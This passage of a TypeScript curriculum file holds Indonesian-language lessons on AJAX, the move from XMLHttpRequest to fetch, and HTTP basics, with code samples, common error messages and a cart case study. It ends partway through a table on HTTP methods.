import {
  callout,
  checklist,
  code,
  divider,
  h2,
  ol,
  p,
  references,
  steps,
  table,
  terms,
  ul,
} from '@/lib/content/builders';
import { type LessonDraft, written } from '@/lib/curriculum/authoring';

/** Frontend Basic — Chapter 5, all twelve lessons. Every sample was executed before writing. */
export const lessons: LessonDraft[] = [
  written(
    'apa-itu-ajax',
    'Apa itu AJAX & dari `XMLHttpRequest` ke `fetch`',
    19,
    'Kenapa halaman web bisa memperbarui sebagian isinya tanpa memuat ulang.',
    [
      p(
        'Sebelum 2005, setiap interaksi berarti memuat ulang seluruh halaman. Menekan "Simpan" mengirim form, server membalas dokumen HTML baru, dan browser menggambar ulang semuanya — layar berkedip putih, posisi scroll hilang, isi form lain lenyap.',
      ),
      p(
        '**AJAX** (Asynchronous JavaScript And XML) mengubah itu: JavaScript mengirim permintaan di latar belakang, menerima data, lalu memperbarui **bagian** halaman yang perlu saja. Namanya menyebut XML karena format itu yang populer saat itu; hari ini hampir semuanya JSON, tapi namanya terlanjur melekat.',
      ),

      terms(
        {
          term: 'AJAX',
          meaning:
            'Singkatan *Asynchronous JavaScript And XML*, dibaca "a-jaks". Teknik mengirim permintaan ke server **di latar belakang** lalu memperbarui hanya **bagian** halaman yang perlu, tanpa memuat ulang seluruhnya. Catatan sejarah yang penting: huruf X-nya menyebut XML karena format itu yang populer pada 2005; hari ini hampir semuanya JSON, tapi namanya sudah terlanjur melekat.',
        },
        {
          term: 'XMLHttpRequest',
          meaning:
            'Sering disingkat **XHR**. Objek generasi pertama untuk mengirim permintaan dari JavaScript. Berbasis callback, penanganan errornya tersebar di beberapa property (`onload`, `onerror`), dan tidak bisa dirangkai. Kamu tidak perlu menulisnya lagi, tapi perlu bisa mengenalinya di kode lama.',
        },
        {
          term: 'fetch',
          meaning:
            'Artinya **mengambil**. Pengganti modern `XMLHttpRequest` yang mengembalikan **Promise**, sehingga bisa dipakai dengan `await` dan `try`/`catch` biasa. Satu perilakunya wajib dihafal sejak sekarang: **`fetch` tidak menolak untuk status 404 atau 500** — bagi dia, jawaban "tidak ditemukan" tetap permintaan yang berhasil sampai tujuan.',
        },
        {
          term: 'request',
          meaning:
            'Terjemahannya **permintaan**. Pesan yang dikirim browser ke server, berisi method, alamat, header, dan kadang badan pesan.',
        },
        {
          term: 'response',
          meaning:
            'Terjemahannya **jawaban** atau respons. Pesan balasan dari server, berisi status, header, dan badan pesan. Perlu diingat: objek respons **belum berisi datanya** — datanya baru keluar setelah `await res.json()`.',
        },
        {
          term: 'JSON',
          meaning:
            'Singkatan *JavaScript Object Notation*, dibaca "je-son". Format teks untuk bertukar data yang bentuknya menyerupai object literal JavaScript. Format baku hampir semua API hari ini, menggantikan XML yang jauh lebih bertele-tele.',
        },
        {
          term: 'XML',
          meaning:
            'Singkatan *eXtensible Markup Language*. Format bertukar data berbasis tag seperti HTML. Masih dipakai di beberapa sistem lama dan RSS, tapi untuk API baru hampir selalu kalah dari JSON karena jauh lebih panjang untuk data yang sama.',
        },
        {
          term: 'SPA',
          meaning:
            'Singkatan *Single Page Application*, terjemahannya **aplikasi satu halaman**. Aplikasi yang memuat satu dokumen HTML lalu mengganti isinya dari JavaScript, alih-alih berpindah halaman. AJAX adalah teknik yang memungkinkannya — tanpa AJAX, SPA tidak punya cara mengambil data baru.',
        },
        {
          term: 'endpoint',
          meaning:
            'Terjemahannya **titik ujung**. Satu alamat di server yang melayani permintaan tertentu, misalnya `/api/pengguna`. Kamu akan merancang endpoint sendiri nanti di kategori Backend; di bab ini kamu berlatih memakainya.',
        },
      ),

      h2('Yang berubah bagi pengguna'),
      table(
        ['', 'Tanpa AJAX', 'Dengan AJAX'],
        [
          ['Menyimpan form', 'Seluruh halaman dimuat ulang', 'Hanya pesan status yang berubah'],
          ['Mencari', 'Pindah halaman hasil', 'Hasil muncul sambil mengetik'],
          ['Posisi scroll', 'Kembali ke atas', 'Tetap'],
          ['Isi form lain', 'Hilang', 'Tetap'],
        ],
      ),

      h2('`XMLHttpRequest` — cara lama'),
      code(
        'js',
        `
        const xhr = new XMLHttpRequest();
        xhr.open('GET', '/api/data');

        xhr.onload = function () {
          if (xhr.status >= 200 && xhr.status < 300) {
            const data = JSON.parse(xhr.responseText);
            tampilkan(data);
          } else {
            tampilkanError(xhr.status);
          }
        };

        xhr.onerror = function () { tampilkanError('jaringan'); };
        xhr.send();
        `,
        { caption: 'Berbasis callback, penanganan error tersebar, dan tidak bisa dirangkai.' },
      ),
      p(
        'Tiga belas baris ini melakukan pekerjaan yang sama dengan tiga baris `fetch` di bawah, dan membandingkannya menjelaskan kenapa `fetch` lahir. Perhatikan penanganan error **terbelah dua tempat**. `onload` menangani respons yang tiba tapi statusnya gagal, sedangkan `onerror` menangani permintaan yang tidak pernah sampai. Keduanya harus ditulis terpisah dan mudah lupa salah satunya. Perhatikan juga pemeriksaan `status >= 200 && status < 300` yang ditulis tangan, sebab belum ada `res.ok` yang meringkasnya. Dan karena semuanya berbasis callback, tidak ada nilai yang bisa dikembalikan ke pemanggil. `xhr` tidak menghasilkan apa pun yang bisa di-`await` maupun dirangkai, sehingga dua permintaan berurutan harus ditumpuk ke dalam seperti callback hell di Bab 3. Kamu masih akan menemui `XMLHttpRequest` di kode lama, dan memahaminya berguna untuk membaca, bukan untuk ditulis baru.',
      ),

      h2('`fetch` — cara sekarang'),
      code(
        'js',
        `
        const res = await fetch('/api/data');
        if (!res.ok) throw new Error(\`Server balas \${res.status}\`);
        const data = await res.json();
        `,
      ),
      p(
        'Tiga baris ini menggantikan tiga belas baris di atas, tapi yang berubah bukan sekadar jumlahnya. Karena `fetch` mengembalikan Promise, `await` bisa dipakai dan hasilnya bisa **dikembalikan ke pemanggil**, sesuatu yang mustahil pada gaya callback. Penanganan errornya pun menyatu, sebab kegagalan jaringan menolak promise-nya dan langsung ditangkap `try`/`catch` di luar tanpa jalur terpisah. Baris tengah adalah yang paling penting dan paling sering dilupakan, yaitu bahwa **`fetch` tidak menganggap `404` maupun `500` sebagai kegagalan.** Bagi `fetch`, permintaan yang sampai ke server dan dijawab adalah permintaan yang berhasil, apa pun isi jawabannya. Karena itu `res.ok`, yang bernilai `true` hanya untuk status 200–299, wajib diperiksa sendiri. Menghilangkan baris itu membuat `res.json()` mencoba mengurai halaman error sebagai data.',
      ),
      table(
        ['', '`XMLHttpRequest`', '`fetch`'],
        [
          ['Berbasis', 'Callback', 'Promise'],
          ['Bisa dirangkai', 'Tidak', 'Ya'],
          ['Bisa dibatalkan', 'Ya (`abort()`)', 'Ya (`AbortController`)'],
          ['Progres unggah', '**Ya**', 'Tidak langsung'],
          ['Streaming respons', 'Terbatas', '**Ya**'],
          ['Menolak untuk 404/500', 'Tidak', 'Tidak'],
        ],
      ),
      callout(
        'info',
        'Satu hal yang masih dipegang `XMLHttpRequest`',
        'Progres unggah (`upload.onprogress`). `fetch` belum punya padanan yang sederhana untuk itu, jadi library unggahan berkas besar kadang masih memakainya. Untuk semua kebutuhan lain, `fetch`.',
      ),

      h2('Kenapa masih perlu tahu keduanya'),
      p(
        'Kamu akan bertemu `XMLHttpRequest` di kode lama, di library yang belum diperbarui, dan di jawaban Stack Overflow berumur sepuluh tahun. Mengenalinya membuatmu bisa membacanya — dan tahu bahwa ia bisa diganti.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Halaman keranjang belanja punya tombol tambah dan kurang jumlah di tiap barisnya. Versi pertama dibuat tanpa AJAX sama sekali, yaitu tiap tombol adalah formulir kecil yang mengirim ke server lalu halaman dimuat ulang. Fungsinya benar, dan pengalamannya buruk. Setiap klik membuat layar berkedip putih, posisi gulir kembali ke atas, dan pengguna yang sedang mengisi catatan pengiriman kehilangan ketikannya.',
      ),
      p(
        'Perbandingan di bawah menunjukkan apa yang sebenarnya berubah, dan yang berubah bukan jumlah permintaan melainkan **apa yang dibuang** setiap kali permintaan itu selesai.',
      ),
      code(
        'html',
        `
        <!-- Tanpa AJAX: peramban memuat ulang seluruh halaman tiap klik. -->
        <form method="post" action="/keranjang/tambah">
          <input type="hidden" name="produkId" value="7" />
          <button type="submit">+</button>
        </form>

        <!-- Yang ikut hilang setiap kali:
             posisi gulir, fokus keyboard, isi kolom catatan yang belum dikirim,
             seluruh gambar yang harus diunduh ulang, dan sekitar 300 ms layar putih -->
        `,
        { filename: 'Versi lama' },
      ),
      code(
        'js',
        `
        // Dengan AJAX: hanya angkanya yang berubah, halaman tetap utuh.
        daftar.addEventListener('click', async (peristiwa) => {
          const tombol = peristiwa.target.closest('[data-aksi="ubah-jumlah"]');
          if (!tombol) return;

          const baris = tombol.closest('[data-produk-id]');
          const produkId = baris.dataset.produkId;
          const delta = Number(tombol.dataset.delta);

          tombol.disabled = true;
          try {
            const respons = await fetch('/api/keranjang/ubah', {
              method: 'PATCH',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ produkId, delta }),
            });
            if (!respons.ok) throw new Error(\`Server menjawab \${respons.status}\`);

            const { jumlah, subtotalSen, totalSen } = await respons.json();

            // Perbarui TIGA angka. Sisanya di halaman tidak tersentuh.
            baris.querySelector('.jumlah').textContent = String(jumlah);
            baris.querySelector('.subtotal').textContent = formatRupiah(subtotalSen);
            document.querySelector('#total').textContent = formatRupiah(totalSen);
          } catch (galat) {
            tampilkanBanner('Gagal mengubah jumlah, coba lagi');
          } finally {
            tombol.disabled = false;
          }
        });
        `,
        { filename: 'src/keranjang.js' },
      ),
      p(
        'Perhatikan server mengirim **tiga** angka sekaligus, yaitu jumlah barisnya, subtotal barisnya, dan total keseluruhan. Ini keputusan desain yang sering keliru diambil. Kalau server hanya mengirim jumlah barunya, klien harus menghitung sendiri subtotal dan totalnya, dan itu berarti aturan harga ada di dua tempat. Cepat atau lambat keduanya menyimpang, dan yang terlihat pengguna berbeda dari yang ditagih server.',
      ),
      p(
        'Baris `tombol.disabled = true` yang dipasangkan dengan `finally` menutup masalah klik ganda pada jaringan lambat. Tanpa itu, pengguna yang menekan tombol tambah tiga kali cepat akan mengirim tiga permintaan yang saling mendahului, dan angka yang akhirnya tampil bergantung pada mana yang selesai belakangan. Ini persis race condition dari Bab 3, muncul dalam bentuk yang paling sering ditemui.',
      ),
      p(
        'Yang perlu dicatat jujur, AJAX tidak selalu lebih baik. Halaman yang isinya hampir seluruhnya berubah, misalnya berpindah dari daftar produk ke halaman detail, tidak mendapat keuntungan apa pun dari mengganti isi lewat JavaScript. Yang didapat justru kerugian, yaitu tombol kembali peramban perlu diurus sendiri, alamat halaman perlu diperbarui manual, dan mesin pencari bisa kesulitan membacanya. AJAX paling menguntungkan untuk perubahan **kecil** pada halaman yang sebagian besarnya tetap.',
      ),
      callout(
        'info',
        'Nama AJAX sudah tidak akurat dan tetap dipakai',
        'Singkatannya berarti JavaScript asinkron dan XML, dan XML praktis tidak lagi dipakai sejak JSON menggantikannya. Objek `XMLHttpRequest` yang menjadi asalnya pun sudah digantikan `fetch`. Yang bertahan hanya namanya, sebagai sebutan untuk gagasan mengambil data tanpa memuat ulang halaman.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Empat kegagalan berikut adalah yang paling sering muncul saat sebuah halaman pertama kali diubah menjadi memakai AJAX. Semuanya diuji langsung terhadap server sungguhan.',
      ),
      code(
        'text',
        `
        const r = await fetch('/api/404');
        console.log(r.ok, r.status);

        false 404
        (fetch TIDAK melempar apa pun)
        `,
        { caption: 'Status kegagalan dianggap permintaan yang berhasil.' },
      ),
      p(
        'Inilah kesalahpahaman nomor satu tentang `fetch`, dan akibatnya paling sering berupa halaman yang menampilkan data kosong alih-alih pesan kesalahan. `fetch` hanya menolak kalau permintaannya **tidak sampai**, misalnya tidak ada jaringan atau nama domain tidak ditemukan. Respons 404 dan 500 tetap dianggap berhasil, sebab permintaannya memang sampai dan dijawab. Pemeriksaan `if (!respons.ok)` wajib ditulis sendiri di setiap pemanggilan.',
      ),
      code(
        'text',
        `
        const r = await fetch('/api/html');
        await r.json();

        SyntaxError: Unexpected token '<', "<!doctype "... is not valid JSON
        `,
        { caption: 'Server mengirim halaman HTML, dan kodenya membacanya sebagai JSON.' },
      ),
      p(
        'Pesan ini sangat khas dan langsung memberi tahu penyebabnya, yaitu isinya diawali tanda kurung sudut. Dua penyebab yang paling sering, yaitu alamatnya salah sehingga server mengirim halaman error 404 miliknya sendiri, atau sesi pengguna habis sehingga server mengalihkan ke halaman masuk. Keduanya membuat server mengirim HTML padahal kodemu mengharapkan JSON. Periksa alamatnya di tab Network, dan lihat isi responsnya sebelum menduga bugnya ada di penguraian.',
      ),
      code(
        'text',
        `
        const r = await fetch('/api/json');
        await r.json();
        await r.json();

        TypeError: Body is unusable: Body has already been read
        `,
        { caption: 'Badan respons hanya bisa dibaca sekali.' },
      ),
      p(
        'Badan respons berupa aliran yang mengalir sekali lalu habis. Ini sering muncul pada kode penanganan galat yang mencoba membaca teksnya setelah `json()` gagal, misalnya `try { await r.json() } catch { await r.text() }`. Kalau kamu butuh membacanya dua kali, salin responsnya lebih dulu dengan `r.clone()`, atau baca sekali sebagai teks lalu urai sendiri dengan `JSON.parse`.',
      ),
      code(
        'text',
        `
        await fetch('http://tidak-ada-sama-sekali.invalid/x');

        TypeError: fetch failed
          cause: ENOTFOUND
        `,
        { caption: 'Kegagalan jaringan sungguhan, dan hanya ini yang membuat `fetch` melempar.' },
      ),
      p(
        'Di Node.js pesannya `fetch failed` dengan penyebab teknis tersimpan di properti `cause`. Di peramban pesannya berbeda, yaitu `Failed to fetch`, dan peramban sengaja tidak memberi tahu penyebab detailnya karena itu bisa dipakai memindai jaringan lokal pengguna. Akibatnya, di peramban kamu tidak bisa membedakan tidak ada internet dari salah alamat hanya dari pesannya. Yang bisa dipakai adalah `navigator.onLine` sebagai petunjuk kasar.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            'Halaman menampilkan data kosong padahal server menjawab 500',
            '`fetch` tidak melempar untuk status kegagalan',
            'Periksa `respons.ok` sebelum membaca badannya',
          ],
          [
            "`Unexpected token '<' ... is not valid JSON`",
            'Server mengirim HTML, biasanya halaman 404 atau halaman masuk',
            'Periksa alamat dan status di tab Network sebelum mengurai',
          ],
          [
            '`Body is unusable: Body has already been read`',
            'Badan respons dibaca dua kali',
            'Pakai `respons.clone()`, atau baca sekali sebagai teks lalu `JSON.parse`',
          ],
          [
            '`TypeError: fetch failed` atau `Failed to fetch`',
            'Permintaan tidak sampai sama sekali',
            'Periksa jaringan, alamat, dan kemungkinan CORS di tab Network',
          ],
          [
            'Angka di layar berbeda dari yang ditagih server',
            'Perhitungan dilakukan di klien juga',
            'Kirim seluruh angka hasil dari server, jangan hitung ulang di klien',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Memindahkan halaman ke AJAX mengubah lebih banyak hal daripada yang terlihat, dan sebagian besar baris di bawah adalah tentang hal yang tadinya diurus peramban dan kini menjadi tanggung jawabmu.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menghitung ulang total di klien setelah menerima jawaban',
            'Servernya kan hanya perlu menyimpan',
            'Aturan harga jadi ada di dua tempat dan pasti menyimpang. Biarkan server menghitung, dan klien hanya menampilkan',
          ],
          [
            'Melupakan keadaan memuat karena server lokal selalu cepat',
            'Responsnya seketika saat diuji',
            'Di jaringan seluler pengguna melihat tombol yang seakan tidak bereaksi. Pakai pembatas jaringan di DevTools saat menguji',
          ],
          [
            'Menganggap AJAX selalu lebih baik daripada muat ulang biasa',
            'Terasa lebih modern',
            'Untuk perpindahan halaman utuh, muat ulang biasa lebih sederhana dan tombol kembali bekerja tanpa kode apa pun. AJAX untuk perubahan kecil',
          ],
          [
            'Mengubah isi halaman tanpa memperbarui alamatnya',
            'Isinya kan sudah berganti',
            'Tombol kembali, muat ulang, dan berbagi tautan semuanya rusak. Kalau perubahannya berarti halaman baru, perbarui alamat dengan `history.pushState`',
          ],
          [
            'Tidak mengumumkan perubahan kepada pembaca layar',
            'Perubahannya jelas terlihat',
            'Perubahan yang dibuat JavaScript tidak diumumkan secara bawaan. Tambahkan `aria-live` pada area yang berubah',
          ],
          [
            'Mengandalkan pemeriksaan di klien sebagai penjaga',
            'Sudah diperiksa sebelum dikirim',
            'Siapa pun bisa memanggil API-mu langsung tanpa lewat halamanmu. Server wajib memeriksa ulang semuanya',
          ],
        ],
      ),
      p(
        'Baris keempat sering baru disadari setelah pengguna mengeluh. Saat halaman berubah tanpa memuat ulang, peramban tidak tahu ada sesuatu yang berubah, sehingga riwayatnya tidak bertambah. Pengguna yang menekan tombol kembali akan keluar dari aplikasi alih-alih kembali ke daftar. Untuk perubahan yang setara berpindah halaman, `history.pushState` beserta penangan `popstate` adalah bagian yang tidak bisa dilewati.',
      ),
      callout(
        'tip',
        'Buka tab Network sebelum menduga bugnya ada di kodemu',
        'Tab Network menampilkan alamat yang benar-benar diminta, status yang benar-benar dijawab, dan isi respons apa adanya. Sebagian besar bug AJAX terjawab dalam sepuluh detik di sana, dan sebagian besar waktu penelusuran terbuang karena orang menebak lebih dulu. Centang juga Preserve log supaya catatannya tidak hilang saat halaman berpindah.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        'AJAX = memperbarui sebagian halaman tanpa memuat ulang seluruhnya.',
        'Namanya menyebut XML karena sejarah; isinya hampir selalu JSON sekarang.',
        '`fetch` berbasis Promise, bisa dirangkai, dan mendukung streaming.',
        '`XMLHttpRequest` masih unggul untuk progres unggah.',
        'Keduanya sama-sama **tidak** menolak untuk status 404 atau 500.',
      ),
      references(
        {
          label: 'Using the Fetch API',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch',
          source: 'MDN',
          note: 'Pengganti resmi `XMLHttpRequest`, lengkap dengan catatan bahwa ia tidak menolak untuk 404.',
        },
        {
          label: 'XMLHttpRequest',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest',
          source: 'MDN',
          note: 'Dibaca bukan untuk dipakai lagi, melainkan agar kamu mengenalinya di kode lama.',
        },
        {
          label: 'AJAX',
          href: 'https://developer.mozilla.org/en-US/docs/Glossary/AJAX',
          source: 'MDN',
          note: 'Definisi ringkas beserta catatan kenapa huruf X-nya sudah tidak relevan lagi.',
        },
        {
          label: 'JSON',
          href: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON',
          source: 'MDN',
          note: 'Format baku yang menggantikan XML, beserta `parse` dan `stringify`.',
        },
        {
          label: 'ProgressEvent',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/ProgressEvent',
          source: 'MDN',
          note: 'Alasan `XMLHttpRequest` masih unggul untuk menampilkan progres unggahan.',
        },
      ),
    ],
  ),

  written(
    'http-dasar',
    'HTTP Dasar: method, status code, header',
    23,
    'Bahasa yang dipakai browser dan server untuk berbicara — dan yang akan kamu pakai lagi di seluruh kategori Backend.',
    [
      p(
        'Setiap permintaan HTTP punya bentuk yang sama: **method**, **URL**, **header**, dan kadang **body**. Setiap respons punya **status code**, **header**, dan **body**. Menguasai empat bagian ini membuat sisi frontend dan backend terasa seperti satu bahasa.',
      ),

      terms(
        {
          term: 'HTTP',
          meaning:
            'Singkatan *HyperText Transfer Protocol*, terjemahannya **protokol pengiriman hiperteks**. Aturan baku yang dipakai browser dan server untuk saling berbicara. Menguasainya membuat sisi frontend dan backend terasa seperti satu bahasa — dan seluruh kategori Backend nanti berdiri di atas bab ini.',
        },
        {
          term: 'method',
          meaning:
            'Terjemahannya **kata kerja permintaan**. Kata di awal permintaan yang menyatakan **maksudmu**: `GET` untuk membaca, `POST` untuk membuat, `PUT` untuk mengganti, `DELETE` untuk menghapus. Bukan sekadar formalitas — perantara jaringan dan cache memperlakukan tiap method secara berbeda berdasarkan sifatnya.',
        },
        {
          term: 'aman (safe)',
          meaning:
            'Sifat method yang **tidak mengubah apa pun** di server. Hanya `GET` dan `HEAD` yang aman. Konsekuensi praktisnya penting: tautan dan tombol yang mengubah data **tidak boleh** memakai `GET`, karena browser dan crawler web bebas memanggilnya kapan saja tanpa diminta.',
        },
        {
          term: 'idempoten',
          meaning:
            'Dibaca "i-dem-po-ten". Sifat operasi yang **hasil akhirnya sama meski dijalankan berkali-kali**. `DELETE` bersifat idempoten, sebab menghapus dua kali tetap menghasilkan "tidak ada". `POST` tidak, sebab mengirim dua kali menghasilkan dua data. Ini yang menentukan boleh-tidaknya sebuah permintaan diulang otomatis saat gagal.',
        },
        {
          term: 'status code',
          meaning:
            'Terjemahannya **kode status**. Angka tiga digit di jawaban server yang menyatakan hasilnya. Digit pertamanya sudah memberi tahu banyak: **2xx** berhasil, **3xx** dialihkan, **4xx** kesalahan dari pihak klien, **5xx** kesalahan dari pihak server. Membedakan 4xx dan 5xx menentukan apakah kamu perlu memperbaiki permintaanmu atau menunggu server pulih.',
        },
        {
          term: 'header',
          meaning:
            'Terjemahannya **kepala pesan**. Pasangan nama–nilai yang membawa keterangan **tentang** permintaan atau jawaban, bukan isinya — misalnya `Content-Type` yang menyatakan format badan pesan, atau `Authorization` yang membawa identitas.',
        },
        {
          term: 'body',
          meaning:
            'Terjemahannya **badan pesan**. Isi sebenarnya yang dikirim, biasanya JSON. `GET` dan `DELETE` umumnya tidak punya body — datanya dititipkan di URL sebagai query string.',
        },
        {
          term: 'Content-Type',
          meaning:
            'Header yang menyatakan **format** badan pesan: `application/json`, `text/html`, `multipart/form-data`. Salah menyebutkannya adalah penyebab umum server menolak dengan `400` meski datamu sebenarnya sudah benar.',
        },
        {
          term: 'Authorization',
          meaning:
            'Header yang membawa **bukti identitas** ke server, paling sering dalam bentuk `Bearer <token>`. Dibahas tuntas di Sub-bab 5.7 beserta perbandingannya dengan cookie.',
        },
        {
          term: 'URL',
          meaning:
            'Singkatan *Uniform Resource Locator*. Alamat lengkap sebuah sumber daya. Bagian-bagiannya punya nama sendiri: **protokol** (`https:`), **host** (`contoh.id`), **path** (`/api/tugas`), dan **query string** (`?halaman=2`). Ketiga bagian pertama menentukan *origin*, yang menjadi inti pembahasan CORS di Sub-bab 5.6.',
        },
      ),

      h2('Bentuk permintaan'),
      code(
        'text',
        `
        POST /api/tugas HTTP/1.1
        Host: contoh.id
        Content-Type: application/json
        Authorization: Bearer eyJhbGci...

        {"judul":"Belajar HTTP"}
        `,
      ),
      p(
        'Ini bentuk mentah yang benar-benar dikirim ke server, dan melihatnya sekali membuat seluruh opsi `fetch` masuk akal. Baris pertama memuat tiga hal, yaitu method, path, dan versi protokol. Tiga baris berikutnya adalah header, masing-masing sepasang `Nama: nilai`. `Content-Type` mengumumkan format body, dan dari baris inilah server memilih cara mengurainya, sebab tanpa itu JSON yang kamu kirim bisa ditolak karena server tidak tahu itu JSON. `Authorization` membawa kredensial dengan awalan `Bearer`. Lalu ada **satu baris kosong** yang memisahkan header dari body. Baris itu wajib ada, dan itulah batas yang membuat server tahu di mana isi sebenarnya dimulai. Semua opsi yang nanti kamu tulis di `fetch(url, { method, headers, body })` pada akhirnya hanya menyusun teks seperti ini.',
      ),

      h2('Method'),
      table(
        ['Method', 'Maksud', 'Aman?', 'Idempoten?'],
        [
          ['`GET`', 'Membaca', '**Ya**', '**Ya**'],
          ['`POST`', 'Membuat / aksi', 'Tidak', '**Tidak**'],
          ['`PUT`', 'Mengganti seluruhnya', 'Tidak', '**Ya**'],
          ['`PATCH`', 'Mengubah sebagian', 'Tidak', 'Tidak selalu'],
          ['`DELETE`', 'Menghapus', 'Tidak', '**Ya**'],
        ],
        '**Aman** = tidak mengubah apa pun. **Idempoten** = dijalankan berkali-kali, hasil akhirnya sama.',
      ),
      callout(
        'warning',
        'Kenapa `GET` tidak boleh mengubah data',
        'Browser, proxy, dan prefetch bebas memanggil `GET` kapan saja tanpa diminta pengguna — bahkan hanya karena tautannya terlihat. Endpoint `GET /hapus?id=5` bisa terpanggil sendiri oleh pemindai tautan atau pratinjau. Ini pernah menghapus data produksi orang sungguhan.',
      ),

      h2('Status code'),
      table(
        ['Kelompok', 'Arti', 'Yang sering kamu temui'],
        [
          ['`2xx`', 'Berhasil', '`200` OK · `201` Created · `204` No Content'],
          ['`3xx`', 'Pengalihan', '`301` permanen · `302` sementara · `304` Not Modified'],
          ['`4xx`', '**Kesalahan klien**', '`400` · `401` · `403` · `404` · `409` · `422` · `429`'],
          ['`5xx`', '**Kesalahan server**', '`500` · `502` · `503` · `504`'],
        ],
      ),
      callout(
        'tip',
        'Empat yang paling sering tertukar',
        '`401` = kamu **belum** terautentikasi (silakan login). `403` = kamu sudah dikenali tapi **tidak berhak**. `400` = bentuk permintaannya salah. `422` = bentuknya benar tapi isinya tidak valid secara aturan bisnis.',
      ),
      code(
        'js',
        `
        // Menerjemahkan status jadi tindakan, bukan sekadar pesan
        if (res.status === 401) arahkanKeLogin();
        else if (res.status === 403) tampilkan('Kamu tidak punya akses ke halaman ini.');
        else if (res.status === 404) tampilkan('Data yang kamu cari tidak ada.');
        else if (res.status === 429) tampilkan('Terlalu banyak permintaan. Coba lagi sebentar.');
        else if (res.status >= 500) tampilkan('Server sedang bermasalah. Coba lagi nanti.');
        `,
      ),
      p(
        'Perhatikan bahwa tiap cabang menghasilkan **tindakan yang berbeda**, bukan sekadar kalimat yang berbeda, dan itulah gunanya membedakan status code. `401` tidak ditampilkan sebagai pesan sama sekali, karena ia langsung mengarahkan ke halaman login, sebab pengguna memang tidak bisa berbuat apa-apa selain masuk. `403` sebaliknya **tidak boleh** mengarah ke login, karena pengguna sudah masuk dan melemparnya ke halaman login hanya akan membingungkan. `429` mendapat kalimat yang menyarankan menunggu, karena masalahnya memang sementara. Dan `5xx` dikelompokkan dengan `>=` alih-alih disebut satu per satu, karena bagi pengguna semua kesalahan server berarti hal yang sama, yaitu bukan salahmu dan coba lagi nanti. Menyeragamkan semuanya menjadi satu pesan "Terjadi kesalahan" membuang seluruh informasi yang sebenarnya sudah tersedia.',
      ),

      h2('Header yang paling sering dipakai'),
      table(
        ['Header', 'Arah', 'Gunanya'],
        [
          ['`Content-Type`', 'Keduanya', 'Format body — `application/json`, `multipart/form-data`'],
          ['`Accept`', 'Permintaan', 'Format yang klien inginkan'],
          ['`Authorization`', 'Permintaan', '`Bearer <token>`'],
          ['`Cache-Control`', 'Keduanya', 'Boleh disimpan berapa lama'],
          ['`ETag` / `If-None-Match`', 'Keduanya', 'Permintaan bersyarat → `304`'],
          ['`Location`', 'Respons', 'Alamat sumber daya yang baru dibuat'],
          ['`Retry-After`', 'Respons', 'Kapan boleh mencoba lagi'],
        ],
      ),
      code(
        'js',
        `
        const res = await fetch('/api/data');

        res.headers.get('content-type');        // 'application/json; charset=utf-8'
        res.headers.has('etag');                // true/false
        [...res.headers.entries()];             // semua header yang boleh dibaca

        // Nama header TIDAK case-sensitive
        res.headers.get('Content-Type') === res.headers.get('content-type');   // true
        `,
      ),
      p(
        "`res.headers` bukan object biasa, jadi `res.headers['content-type']` tidak akan bekerja. Ia objek `Headers` dengan method sendiri, dan itu penyebab umum \"header-nya `undefined` padahal jelas ada\". Perhatikan nilai yang dikembalikan baris pertama memuat lebih dari sekadar tipe, karena `application/json; charset=utf-8` menyertakan parameter tambahan setelah titik koma, sehingga membandingkannya dengan `=== 'application/json'` akan gagal. Pakai `includes` bila kamu perlu memeriksanya. Baris terakhir menegaskan sifat yang menyenangkan, yaitu nama header **tidak peka huruf besar-kecil**, jadi kamu tidak perlu menebak apakah server menulisnya `Content-Type` atau `content-type`. Yang perlu diwaspadai justru disebut di kotak berikut, sebab pada permintaan lintas origin sebagian header tidak bisa dibaca sama sekali meski server mengirimnya.",
      ),
      callout(
        'info',
        'Kamu tidak bisa membaca semua header respons',
        'Untuk permintaan lintas origin, browser hanya membuka beberapa header aman kecuali server mengizinkannya lewat `Access-Control-Expose-Headers`. Kalau `res.headers.get("X-Total")` bernilai `null` padahal server mengirimnya, itu penyebabnya — bukan bug di kodemu.',
      ),

      h2('URL: bagian-bagiannya'),
      code(
        'js',
        `
        const u = new URL('https://contoh.id/api/tugas?status=aktif&hal=2#bagian');

        u.protocol;      // 'https:'
        u.host;          // 'contoh.id'
        u.pathname;      // '/api/tugas'
        u.search;        // '?status=aktif&hal=2'
        u.searchParams.get('status');   // 'aktif'
        u.hash;          // '#bagian'   — tidak pernah dikirim ke server

        // Menambah parameter dengan aman, tanpa merangkai string
        u.searchParams.set('hal', '3');
        u.toString();    // 'https://contoh.id/api/tugas?status=aktif&hal=3#bagian'
        `,
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Kamu diminta menambahkan fitur menyimpan draf artikel setiap tiga puluh detik. Endpointnya sudah ada, dan kamu memakai `POST` karena itu satu-satunya method yang pernah kamu pakai selain `GET`. Setelah dipakai sebulan, tabel draf berisi empat ribu baris untuk seratus artikel, dan tidak ada yang tahu mana yang terbaru. Setiap penyimpanan otomatis membuat baris baru alih-alih memperbarui yang lama.',
      ),
      p(
        'Ini akibat langsung dari memilih method yang salah. Perbedaan `POST`, `PUT`, dan `PATCH` bukan soal gaya melainkan soal janji yang kamu berikan kepada seluruh sistem, termasuk kepada peramban, kepada proksi, dan kepada dirimu sendiri enam bulan kemudian.',
      ),
      table(
        ['Method', 'Artinya', 'Boleh diulang tanpa efek tambahan?'],
        [
          ['`GET`', 'Ambil sesuatu, jangan ubah apa pun', 'Ya. Boleh di-cache dan diulang bebas'],
          ['`POST`', 'Buat sesuatu yang baru', '**Tidak.** Dua kali kirim berarti dua baris'],
          [
            '`PUT`',
            'Ganti seluruh isi sumber daya di alamat ini',
            'Ya. Hasil akhirnya sama berapa kali pun',
          ],
